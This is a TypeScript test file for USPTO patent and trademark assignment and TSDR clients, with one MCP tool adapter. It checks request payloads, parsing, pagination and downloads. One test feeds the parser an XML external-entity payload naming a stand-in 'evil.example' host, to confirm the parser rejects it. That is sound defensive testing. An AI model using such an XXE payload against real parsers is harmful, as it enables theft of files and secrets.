import { describe, expect, test } from "bun:test";
import { AssignmentCenterClient } from "../packages/client/src/assignments.js";
import { TrademarkAssignmentClient } from "../packages/client/src/trademark-assignments.js";
import { ApiError } from "../packages/client/src/transport.js";
import {
  formatTsdrCaseId,
  parseTrademarkStatus,
  parseTsdrDocuments,
  TsdrClient,
} from "../packages/client/src/tsdr.js";
import { recorded } from "./cassettes.js";

function fakeFetch(
  handler: (request: Request) => Response | Promise<Response>,
): typeof fetch {
  return Object.assign(
    async (input: RequestInfo | URL, init?: RequestInit) =>
      handler(new Request(input, init)),
    { preconnect: fetch.preconnect },
  ) as typeof fetch;
}
const record = (frameNumber: number, conveyance = "ASSIGNMENT") => ({
  reelNumber: 1,
  frameNumber,
  conveyance,
  unknownUpstream: "retained",
});
async function fixture(name: string): Promise<unknown> {
  const value = Bun.YAML.parse(
    await Bun.file(
      new URL(`../../tests/cassettes/${name}.yaml`, import.meta.url),
    ).text(),
  ) as { interactions: { response: { body: { string: string } } }[] };
  return value.interactions[0]?.response.body.string;
}
describe("Assignment Center contract", () => {
  test("patent search sends v3 payload, dates and offsets, preserving unknown fields", async () => {
    const requests: unknown[] = [];
    const client = new AssignmentCenterClient({
      fetch: fakeFetch(async (request) => {
        expect(request.url).toEndWith("/api/v3/public/search/patent");
        requests.push(await request.json());
        return Response.json({
          successResponse: {
            totalRows: 1002,
            data: [record(1), record(2)],
            backendPagination: false,
          },
        });
      }),
    });
    const result = await client.search({
      query: "ACME",
      by: "assignee",
      exact: true,
      offset: 1001,
      limit: 1,
      executedBetween: ["2020-01-01", "2025-12-31"],
    });
    expect(requests).toEqual([
      {
        searchCriteria: [
          {
            property: "ACME",
            searchBy: "assigneeName",
            matchType: "Exact",
            order: 1,
            relation: "AND",
          },
        ],
        dataFilter: {
          filterBy: [
            {
              property: "",
              searchBy: "executionDate",
              startDate: "20200101",
              endDate: "20251231",
            },
          ],
          rowsPerPage: 1000,
          currentPage: 2,
        },
      },
    ]);
    expect(result.records[0]).toMatchObject({
      frameNumber: 2,
      unknownUpstream: "retained",
    });
    expect(result.total).toBe(1002);
  });
  test("conveyance filters across pages before offset", async () => {
    let calls = 0;
    const client = new AssignmentCenterClient({
      fetch: fakeFetch(() => {
        calls++;
        return Response.json({
          successResponse: {
            totalRows: 2000,
            data:
              calls === 1 ? [record(1, "SECURITY"), record(2)] : [record(3)],
            backendPagination: calls === 1,
          },
        });
      }),
    });
    const result = await client.search({
      query: "ACME",
      by: "assignee",
      conveyance: "assignment",
      offset: 1,
      limit: 1,
    });
    expect(calls).toBe(2);
    expect(result.records[0]?.frameNumber).toBe(3);
  });
  test("details retrieves properties and recognizes sequence aliases", async () => {
    const client = new AssignmentCenterClient({
      fetch: fakeFetch(async (request) => {
        expect(await request.json()).toEqual({
          reelNumber: "1",
          frameNumber: "2",
          searchBy: "reelFrame",
          dataFilter: { filterBy: [], rowsPerPage: 10, currentPage: 1 },
        });
        return Response.json({
          successResponse: {
            data: {
              assignment: { pageCount: 2 },
              noOfProperties: 1,
              properties: [
                { propertySequenceNumber: 3, applicationNumber: "123" },
              ],
              future: "retained",
            },
          },
        });
      }),
    });
    expect((await client.details(1, 2)).data).toMatchObject({
      properties: [{ propertySequenceNumber: 3, applicationNumber: "123" }],
      future: "retained",
    });
  });
  test("trademark combined criteria use Exact numbers and Contains names", async () => {
    const client = new TrademarkAssignmentClient({
      fetch: fakeFetch(async (request) => {
        const body = (await request.json()) as {
          searchCriteria: unknown[];
          dataFilter: unknown;
        };
        expect(body.searchCriteria).toEqual([
          {
            property: "Acme",
            searchBy: "assigneeName",
            matchType: "Contains",
            order: 1,
            relation: "",
          },
          {
            property: "12345678",
            searchBy: "serialNumber",
            matchType: "Exact",
            order: 2,
            relation: "AND",
          },
        ]);
        return Response.json({
          successResponse: { data: [record(1), record(2)], totalRows: 2 },
        });
      }),
    });
    const result = await client.search({
      assigneeName: "Acme",
      serialNumber: "12345678",
      startRow: 2,
      limit: 1,
    });
    expect(result.data[0]?.frameNumber).toBe("2");
  });
  test("malformed success payload fails rather than silently returning no matches", async () => {
    const client = new AssignmentCenterClient({
      fetch: fakeFetch(() =>
        Response.json({ successResponse: { data: "bad" } }),
      ),
    });
    await expect(
      client.search({ query: "x", by: "assignee" }),
    ).rejects.toBeInstanceOf(ApiError);
  });
  test("historical Python patent response remains parseable (v2 fixture, not a current v3 contract)", async () => {
    const body = await fixture(
      "tests_uspto_assignments_test_client_py_TestSearchLive_test_search_by_patent",
    );
    const client = new AssignmentCenterClient({
      fetch: fakeFetch(
        () =>
          new Response(String(body), {
            headers: { "content-type": "application/json" },
          }),
      ),
    });
    const result = await client.search({
      query: "10000000",
      by: "patent_number",
    });
    expect(result.records[0]?.reelNumber).toBe(35130);
  });
});
describe("TSDR contract", () => {
  test("separate credential, case normalization, status normalization and unknown fields", async () => {
    const client = new TsdrClient({
      apiKey: "test-secret",
      fetch: fakeFetch((request) => {
        expect(request.headers.get("USPTO-API-KEY")).toBe("test-secret");
        expect(request.url).toEndWith("/casestatus/sn12345678/info");
        return Response.json({
          trademarks: [
            {
              future: "retained",
              status: {
                markElement: "ACME",
                usRegistrationNumber: 12,
                status: 700,
                statusDate: "2026-01-02T00:00:00",
                trademark: true,
              },
              parties: {
                ownerGroups: {
                  current: [
                    {
                      name: "Acme",
                      address1: "One",
                      address2: "Two",
                      addressStateCountry: { iso: { code: "US" } },
                    },
                  ],
                },
              },
              gsList: [{ primeClassCode: "009", description: "Goods" }],
              prosecutionHistory: [
                { entryDate: "2026-02-01T00:00:00", entryCode: "NEW" },
              ],
            },
          ],
        });
      }),
    });
    const result = await client.getStatus("12-345 678");
    expect(result.data).toMatchObject({
      markText: "ACME",
      registrationNumber: "12",
      isRegistered: true,
      isLive: true,
      statusDate: "2026-01-02",
      future: "retained",
      owners: [{ name: "Acme", address: "One, Two", country: "US" }],
      goodsServices: [{ classNumber: 9 }],
    });
    expect((await client.getLastUpdate("12345678")).data.lastUpdateDate).toBe(
      "2026-02-01",
    );
    expect(formatTsdrCaseId("RN1234")).toBe("rn1234");
  });
  test("empty status is explicit; malformed status fails", () => {
    expect(parseTrademarkStatus({ trademarks: [] }, "1").isRegistered).toBe(
      false,
    );
    expect(() => parseTrademarkStatus({ trademarks: "broken" }, "1")).toThrow(
      ApiError,
    );
  });
  test("historical real TSDR XML documents retain identifiers and metadata", async () => {
    const xml = await fixture(
      "tests_uspto_tsdr_test_client_py_TestTsdrClientLive_test_get_documents",
    );
    const result = parseTsdrDocuments(String(xml));
    expect(result.length).toBeGreaterThan(1);
    expect(result[0]).toMatchObject({
      docId: "78787878-CDR",
      docType: "CDR",
      pageCount: 10,
      mailDate: "2025-01-02",
    });
  });
  test("XML rejects external entities and malformed data without any external fetch", async () => {
    let calls = 0;
    const client = new TsdrClient({
      apiKey: "test",
      fetch: fakeFetch(() => {
        calls++;
        return new Response(
          '<!DOCTYPE x [<!ENTITY steal SYSTEM "https://evil.example/key">]><DocumentList>&steal;</DocumentList>',
        );
      }),
    });
    await expect(client.getDocuments("12345678")).rejects.toThrow("unsafe");
    expect(calls).toBe(1);
    expect(() => parseTsdrDocuments("<DocumentList>")).toThrow(ApiError);
  });
  test("PDF/ZIP/image/html/update/batch paths preserve byte and text results", async () => {
    const urls: string[] = [];
    const client = new TsdrClient({
      apiKey: "test",
      fetch: fakeFetch((request) => {
        urls.push(request.url);
        return request.url.includes("info.json") ||
          request.url.includes("caseMultiStatus")
          ? Response.json({ ok: true })
          : new Response(new Uint8Array([1, 2, 3]), {
              headers: { "content-type": "image/png" },
            });
      }),
    });
    expect((await client.downloadDocumentsPdf("12345678")).data).toEqual(
      new Uint8Array([1, 2, 3]),
    );
    await client.downloadDocumentsZip("12345678");
    await client.getImage("12345678");
    await client.getStatusHtml("12345678");
    await client.getStatusJson("12345678");
    await client.batchStatus(["1234-5678", "8765 4321"]);
    expect(
      urls.map((url) => new URL(url).pathname + new URL(url).search),
    ).toEqual([
      "/ts/cd/casedocs/sn12345678/download.pdf",
      "/ts/cd/casedocs/sn12345678/download.zip",
      "/ts/cd/rawImage/12345678",
      "/ts/cd/casestatus/sn12345678/content.html",
      "/last-update/info.json?sn=12345678",
      "/ts/cd/caseMultiStatus/sn?ids=12345678%2C87654321",
    ]);
  });
});

test("all 25 archived current TSDR routes have a library request contract", async () => {
  const paths = new Set<string>();
  const client = new TsdrClient({
    apiKey: "test",
    fetch: fakeFetch((request) => {
      paths.add(new URL(request.url).pathname);
      return new URL(request.url).pathname.endsWith(".json") ||
        new URL(request.url).pathname.includes("caseMultiStatus")
        ? Response.json({})
        : new Response("<root/>");
    }),
  });
  await client.getLastUpdateXml("12345678");
  await client.getStatusJson("12345678");
  await client.batchStatus(["12345678"], { idType: "rn", from: "1", to: "2" });
  for (const delivery of ["content", "download"] as const)
    for (const format of ["pdf", "zip"] as const) {
      await client.downloadDocument("12345678", "doc123", { delivery, format });
      await client.downloadCaseDocuments("12345678", { delivery, format });
      await client.downloadStatus("12345678", { delivery, format });
    }
  await client.getDocumentInfoXml("12345678", "doc123");
  await client.getDocumentPage("12345678", "doc123", "page1");
  await client.getBundleXml(["12345678"]);
  await client.downloadBundle(["12345678"], { format: "pdf" });
  await client.downloadBundle(["12345678"], { format: "zip" });
  await client.getCaseBundleXml("12345678");
  await client.getDocumentsXml("12345678");
  await client.getStatusHtml("12345678");
  await client.getStatusXml("12345678");
  await client.getStatusXml("12345678", { legacy: true });
  const spec = JSON.parse(
    await Bun.file(
      new URL(
        "../references/odp/tsdr-swagger-2026-10-20.yaml",
        import.meta.url,
      ),
    ).text(),
  ) as { paths: Record<string, unknown> };
  const expected = Object.keys(spec.paths).map((path) =>
    path
      .replace("{caseid}", "sn12345678")
      .replace("{docid}", "doc123")
      .replace("{pageid}", "page1")
      .replace("{type}", "rn"),
  );
  expect([...paths].sort()).toEqual(expected.sort());
});

test("current v3 patent search and properties detail replay without live fallback", async () => {
  const client = new AssignmentCenterClient({
    retryLimit: 0,
    timeoutMs: 15000,
  });
  const search = await recorded("assignment-v3-patent", () =>
    client.search({ query: "10000000", by: "patent_number", limit: 1 }),
  );
  expect(search.records).toHaveLength(1);
  expect(search.records[0]?.properties).toHaveLength(0);
  const first = search.records[0];
  if (!first) throw new Error("Fixture lacks assignment");
  const detail = await recorded("assignment-v3-detail", () =>
    client.details(first.reelNumber, first.frameNumber),
  );
  expect(detail.data.properties[0]?.patentNumber).toBe("10000000");
});
test("current v3 trademark search replays without live fallback", async () => {
  const client = new TrademarkAssignmentClient({
    retryLimit: 0,
    timeoutMs: 15000,
  });
  const response = await recorded("assignment-v3-trademark", () =>
    client.searchByAssignee("NIKE", { limit: 1 }),
  );
  expect(response.data).toHaveLength(1);
  expect(response.total).toBe(99);
});

test("thin register MCP adapter passes combined trademark filters and returns normalized status", async () => {
  const { registerRegisterTools } = await import(
    "../packages/mcp/src/registers.js"
  );
  const tools = new Map<
    string,
    {
      input: { parse: (value: unknown) => unknown };
      output: { parse: (value: unknown) => unknown };
      handler: (value: unknown) => Promise<unknown>;
    }
  >();
  const server = {
    tool(
      config: {
        name: string;
        input: { parse: (value: unknown) => unknown };
        output: { parse: (value: unknown) => unknown };
      },
      handler: (value: unknown) => Promise<unknown>,
    ) {
      tools.set(config.name, {
        input: config.input,
        output: config.output,
        handler,
      });
    },
  } as unknown as import("@prefecthq/fastmcp-ts/server").FastMCP;
  const trademarkAssignments = new TrademarkAssignmentClient({
    fetch: fakeFetch(async (request) => {
      const payload = (await request.json()) as {
        searchCriteria: { searchBy: string; property: string }[];
      };
      expect(
        payload.searchCriteria.map((item) => [item.searchBy, item.property]),
      ).toEqual([
        ["assigneeName", "ACME"],
        ["domesticRepresentative", "Agent"],
        ["startDate", "01/2020"],
      ]);
      return Response.json({ successResponse: { data: [], totalRows: 0 } });
    }),
  });
  registerRegisterTools(server, {
    assignments: new AssignmentCenterClient(),
    trademarkAssignments,
    tsdr: new TsdrClient({
      apiKey: "test",
      fetch: fakeFetch((request) => {
        if (request.url.includes("caseMultiStatus"))
          return Response.json({
            transactionList: [
              {
                searchId: "sn12345678",
                trademarks: [{ status: { markElement: "ACME" } }],
              },
            ],
            missedElements: ["87654321"],
          });
        if (request.url.endsWith(".html"))
          return new Response(`<html>${"large raw body".repeat(1000)}</html>`);
        if (
          request.headers.get("accept") === "application/xml" ||
          request.url.endsWith(".xml") ||
          request.url.includes("/casedoc") ||
          request.url.endsWith("/bundle")
        )
          return new Response(
            `<DocumentList>${"large raw body".repeat(1000)}</DocumentList>`,
          );
        return Response.json({
          trademarks: [{ status: { markElement: "ACME" } }],
        });
      }),
    }),
  });
  expect(tools.size).toBe(6);
  const search = tools.get("search_assignments");
  if (!search) throw new Error("Missing search tool");
  const result = await search.handler(
    search.input.parse({
      right: "trademark",
      by: "assignee",
      query: "ACME",
      trademark_filters: {
        domesticRepresentative: "Agent",
        startExecutionDate: "01/2020",
      },
    }),
  );
  expect(result).toMatchObject({ items: [], more_available: false });
  const get = tools.get("get_trademark");
  if (!get) throw new Error("Missing status tool");
  expect(
    await get.handler(get.input.parse({ serial_number: "12345678" })),
  ).toMatchObject({ details: { markText: "ACME" } });
  const batch = await get.handler(
    get.input.parse({ serial_number: ["12345678", "87654321"] }),
  );
  expect(get.output.parse(batch)).toMatchObject({
    items: [
      { serialNumber: "12345678", markText: "ACME" },
      { serialNumber: "87654321", error: { code: "NOT_FOUND" } },
    ],
    next_cursor: null,
    more_available: false,
  });
  expect(batch).not.toHaveProperty("details");
  const { DownloadStore, downloadContext } = await import(
    "../packages/mcp/src/downloads.js"
  );
  const store = new DownloadStore({
    publicBaseUrl: "http://localhost:12345",
    mode: "signed",
  });
  try {
    for (const view of [
      "html",
      "xml",
      "legacy_xml",
      "update_xml",
      "bundle_xml",
      "document_xml",
      "documents_xml",
    ]) {
      const metadata = await downloadContext.run({ store }, () =>
        get.handler(
          get.input.parse({
            serial_number: "12345678",
            document_id: "doc1",
            view,
          }),
        ),
      );
      expect(get.output.parse(metadata)).toMatchObject({
        download_url: expect.stringContaining("http://localhost:12345"),
        filename: expect.stringContaining("12345678"),
        size: expect.any(Number),
      });
      expect(metadata).not.toHaveProperty("details");
      expect(JSON.stringify(metadata)).not.toContain("large raw body");
    }
  } finally {
    await store.close();
  }
});
